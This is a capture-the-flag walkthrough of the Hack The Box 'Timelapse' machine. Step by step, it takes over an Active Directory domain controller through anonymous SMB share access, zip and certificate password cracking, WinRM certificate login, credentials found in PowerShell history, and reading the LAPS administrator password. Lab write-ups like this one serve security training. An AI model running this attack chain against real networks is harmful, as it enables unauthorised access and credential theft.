# Timelapse

Timelapse is a easy HTB lab that focuses on active directory, information disclosure and privilege escalation. In this walkthrough, we will go over the process of exploiting the services and gaining access to the root user.

<!-- toc -->

### Recon
The first step in any penetration testing process is reconnaissance. We can start by running nmap scan on the target machine to identify open ports and services.

```
[★]$ IP=10.129.12.186
[★]$ sudo nmap -p- -sV -sC $IP

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-05 05:11 GMT
Nmap scan report for 10.129.12.186
Host is up (0.012s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2024-01-05 13:15:53Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn:
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2024-01-05T13:17:22+00:00; +8h00m00s from scanner time.
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49695/tcp open  msrpc             Microsoft Windows RPC
64484/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time:
|   date: 2024-01-05T13:16:43
|_  start_date: N/A
|_clock-skew: mean: 7h59m59s, deviation: 0s, median: 7h59m58s
| smb2-security-mode:
|   311:
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 334.60 seconds
```

Enumerating the SMB shares with NULL login.

```
$ sudo crackmapexec smb $IP -u 'a' -p '' --shares;

SMB         10.129.12.186   445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.12.186   445    DC01             [+] timelapse.htb\a:
SMB         10.129.12.186   445    DC01             [+] Enumerated shares
SMB         10.129.12.186   445    DC01             Share           Permissions     Remark
SMB         10.129.12.186   445    DC01             -----           -----------     ------
SMB         10.129.12.186   445    DC01             ADMIN$                          Remote Admin
SMB         10.129.12.186   445    DC01             C$                              Default share
SMB         10.129.12.186   445    DC01             IPC$            READ            Remote IPC
SMB         10.129.12.186   445    DC01             NETLOGON                        Logon server share
SMB         10.129.12.186   445    DC01             Shares          READ
SMB         10.129.12.186   445    DC01             SYSVOL                          Logon server share
```

Enumerating the `Shares` where we have read access and reading files present in it.
```
$ smbclient -N -U 'a' \\\\timelapse.htb\\Shares

smb: \> prompt
smb: \> recurse ON
smb: \> mget *
getting file \Dev\winrm_backup.zip of size 2611 as Dev/winrm_backup.zip (77.3 KiloBytes/sec) (average 77.3 KiloBytes/sec)
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as HelpDesk/LAPS.x64.msi (2663.4 KiloBytes/sec) (average 2470.8 KiloBytes/sec)
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as HelpDesk/LAPS_Datasheet.docx (1821.0 KiloBytes/sec) (average 2397.8 KiloBytes/sec)
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as HelpDesk/LAPS_OperationsGuide.docx (4931.9 KiloBytes/sec) (average 2911.9 KiloBytes/sec)
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as HelpDesk/LAPS_TechnicalSpecification.docx (1613.2 KiloBytes/sec) (average 2826.6 KiloBytes/sec)
```

### User

Zip file is password protected. Cracking the password for the zip downloaded from the SMB.
```
[★]$ zip2john winrm_backup.zip > hash.txt
Created directory: /home/krypten/.john
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: 2b chk, TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683

[★]$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)
1g 0:00:00:00 DONE (2024-01-05 05:03) 2.857g/s 9924Kp/s 9924Kc/s 9924KC/s surfroxy154..supergay01
Use the "--show" option to display all of the cracked passwords reliably
Session completed

[★]$ unzip -P supremelegacy  winrm_backup.zip
Archive:  winrm_backup.zip
  inflating: legacyy_dev_auth.pfx
```

As this is an `pfx` which the key for login. Cracking the key:
```
$ pfx2john.py legacyy_dev_auth.pfx > hash2.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt
thuglegacy       (legacyy_dev_auth.pfx)
```

Creating the public and private key so that we can do login in the system without the password.
```
$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.key-enc
Enter Import Password:
Enter PEM pass phrase:
Verifying - Enter PEM pass phrase:
I’ll decrypt the key using the password I set above so I don’t have to remember it:

$ openssl rsa -in legacyy_dev_auth.key-enc -out legacyy_dev_auth.key
Enter pass phrase for legacyy_dev_auth.key-enc:
writing RSA key
And dump the certificate:

$ openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt
Enter Import Password:
Now both files exist:
```

Logging in the system and getting the user flag:
```
[★]$ evil-winrm -i 10.129.12.186 -u legacyy -c legacyy_dev_auth.crt -k legacyy_dev_auth.key -S

Evil-WinRM shell v3.3

*Evil-WinRM* PS C:\Users\legacyy\Documents> type ..\Desktop\user.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```

### Privilege Escalation

Knowing the privileges for the current user first:
```
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Enumeration locally on the machine:
```
*Evil-WinRM* PS C:\Users\legacyy\Documents> Get-ChildItem -Path "$env:USERPROFILE\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine" |
Format-Table -AutoSize

Mode          LastWriteTime Length Name
----          ------------- ------ ----
-a----   3/3/2022  11:46 PM    434 ConsoleHost_history.txt
```

Viewing the console history, we get the previous commands used. We get the credentials here:
```
*Evil-WinRM* PS C:\Users\legacyy\Documents> type C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^*********%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties "DC=laps,DC=com"
exit
```

Getting shell as `svc_deploy` user.
```
[★]$ evil-winrm -i 10.129.12.186 -u svc_deploy -p 'E3R$Q62^*********%KWaxuaV' -S

Evil-WinRM shell v3.3
Warning: SSL enabled
Info: Establishing connection to remote endpoint
```

Checking for any change in privileges.
```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

Getting domain access permissions for `svc_deploy`.
```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user /domain svc_deploy

User name                    svc_deploy
Full Name                    svc_deploy
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            10/25/2021 11:12:37 AM
Password expires             Never
Password changeable          10/26/2021 11:12:37 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   10/25/2021 11:25:53 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
The command completed successfully.
```

`LAPS_Readers` is new group which this user has access to. Exploit - https://blog.netwrix.com/2021/08/25/running-laps-in-the-race-to-security/

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> Get-ADComputer DC01 -property 'ms-mcs-admpwd'

DistinguishedName : CN=DC01,OU=Domain Controllers,DC=timelapse,DC=htb
DNSHostName       : dc01.timelapse.htb
Enabled           : True
ms-mcs-admpwd     : vLOb;$*********-7&8qMq+1!o
Name              : DC01
ObjectClass       : computer
ObjectGUID        : 6e10b102-6936-41aa-bb98-bed624c9b98f
SamAccountName    : DC01$
SID               : S-1-5-21-671920749-559770252-3318990721-1000
UserPrincipalName :
```

Getting the root flag:
```
[★]$ evil-winrm -i 10.129.12.186 -u Administrator -p 'vLOb;$*********-7&8qMq+1!o' -S

*Evil-WinRM* PS C:\Users\TRX\Desktop> type root.txt
~~~~~~~~~~~~FLAG~~~~~~~~~~~~
```
